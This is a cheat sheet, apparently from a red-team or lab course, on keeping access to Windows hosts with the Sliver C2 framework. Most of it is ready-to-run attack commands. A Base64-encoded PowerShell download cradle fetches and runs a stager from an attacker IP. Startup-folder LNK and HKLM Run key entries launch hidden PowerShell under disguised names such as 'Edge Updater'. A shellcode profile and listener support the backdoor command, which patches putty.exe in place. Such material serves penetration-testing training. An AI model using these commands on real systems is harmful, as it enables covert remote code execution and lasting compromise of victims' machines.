# 15.19 Persistence via Sliver

> Persist via scheduled tasks, startup LNKs (`SharPersist`), Run keys, or Sliver's `backdoor` command (needs shellcode-format profile).

## Overview

Persistence methods include scheduled tasks (via `execute powershell`), startup folder LNK files (SharPersist), registry Run keys (SharPersist), and binary backdooring with Sliver's built-in `backdoor` command. The backdoor command requires a shellcode-format profile.

## Steps

- Convert PowerShell download-cradle to UTF-16LE Base64 for schtask `/enc` argument.
- `execute powershell 'schtasks /create ...'` runs the task creation without spawning cmd.exe.
- `sharpersist -- -t startupfolder` drops a LNK file in the user's Startup folder.
- `sharpersist -- -t reg -k hklmrun -m add` adds a registry Run key entry.
- `backdoor --profile <shellcode-profile> <path-to-exe>` patches an existing binary in-place.
- Verify Run key entries with `sharpersist -- -t reg -k hklmrun -m list`.

## Commands

### Encode PowerShell cradle to Base64

```bash
echo -en "iex(new-object net.webclient).downloadString('http://10.10.14.62:8088/stager.txt')" | iconv -t UTF-16LE | base64 -w 0
```


### Startup folder LNK persistence

```text
sliver (http-beacon) > sharpersist -- -t startupfolder -c \"powershell.exe\" -a \"-nop -w hidden iex(new-object net.webclient).downloadstring(\'http://10.10.14.62:8088/stager.txt\')\" -f \"Edge Updater\" -m add
```

### Registry Run key add

```text
sliver (http-beacon) > sharpersist -- -t reg -c \"powershell.exe\" -a \"-nop -w hidden iex(new-object net.webclient).downloadstring(\'http://10.10.14.62:8088/staged.txt\')\" -k \"hklmrun\" -v \"AdvancedProtection\" -m add
```

### Registry Run key list

```text
sliver (http-beacon) > sharpersist -- -t reg -k \"hklmrun\" -m list
```

### Create shellcode profile for backdoor

```text
sliver (http-beacon) > profiles new --format shellcode --http 10.10.14.62:9002 persistence-shellcode
```

### Start listener for backdoor callbacks

```text
sliver (http-beacon) > http -L 10.10.14.62 -l 9002
```

### Backdoor existing binary

```text
sliver (http-beacon) > backdoor --profile persistence-shellcode "C:\Program Files\PuTTY\putty.exe"
```
